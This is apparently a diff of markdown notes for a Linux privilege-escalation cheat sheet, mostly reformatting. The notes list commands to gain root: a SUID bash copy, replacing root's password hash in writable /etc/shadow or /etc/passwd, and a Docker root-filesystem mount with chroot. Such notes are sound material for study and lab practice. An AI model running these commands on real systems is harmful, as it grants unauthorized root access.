@@ -9,7 +9,7 @@
 Create a copy of /bin/bash or /bin/sh can you call it rootbash - make sure its owned by the root user. Then use /bin/bash -p to run it
 
 				Writable /etc/shadow
-ls -l /etc/shadow					is /etc/shadow writable?
+`ls -l /etc/shadow`					is /etc/shadow writable?
 - mkpasswd -m sha-512 password		Makes password Hash
 - replace root password hash with the one you just generated
 - su root								switch to root
@@ -18,21 +18,24 @@ ls -l /etc/shadow					is /etc/shadow writable?
 
 			 	Writable /etc/passwd
 `ls -l /etc/passwd`					is /etc/passwd writeable?
-- openssl passwd password			      Generate password hash
-- place the new password hash between the first and second colon (:) of the root user's row (replacing the "x").
+- `openssl passwd password`			      Generate password hash
+- place new password hash between first and second colon (:) of the root user's row (replacing the "x").
 - su root							      switch to root
 
 <!-- -->
 
 				Suid
-Find all Suids `find / -perm -u=s -type f 2>/dev/null`
+- Find all Suids `find / -perm -u=s -type f 2>/dev/null`
+
+<!-- -->
 
 				Docker
--- get image name using 'docker ps'
--- docker run -v /:/mnt --rm -it $imagenamehere chroot /mnt sh
+- get image name using 'docker ps'
+- docker run -v /:/mnt --rm -it $imagenamehere chroot /mnt sh
 
-				Capabilities
-## Identifying Capabilities
+<!-- -->
+				Identify Capabilities
+
 `getcap -r / 2>/dev/null`
 
 				LinEnum
